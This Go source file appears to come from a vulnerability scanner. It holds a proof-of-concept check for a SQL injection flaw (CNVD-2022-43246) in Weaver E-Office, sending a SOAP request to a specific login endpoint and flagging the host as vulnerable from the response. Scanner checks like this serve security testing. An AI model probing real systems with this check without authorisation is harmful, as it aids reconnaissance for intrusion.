package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_SQLInjection_CNVD_2022_43246(u string) bool {

	PocData := "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:LoginServicewsdl\">\n<soapenv:Header/>\n<soapenv:Body>\n<urn:GetCurrentInformation soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<UserId xsi:type=\"xsd:string\"></UserId>\n</urn:GetCurrentInformation>\n</soapenv:Body>\n</soapenv:Envelope>\n"
	header := make(map[string]string)
	header["Content-Type"] = "text/xml;charset=UTF-8"
	header["Accept-Encoding"] = "gzip, deflate"
	url := u + "/webservice-json/login/login.wsdl.php"
	if req, err := pkg.HttpRequset(url, "POST", PocData, true, header); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "GetCurrentInformationResponse") && strings.Contains(req.Body, "version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver E_Office_SQLInjection_CNVD_2022_43246!|%s\n", url))
			return true
		}
	}

	return false
}
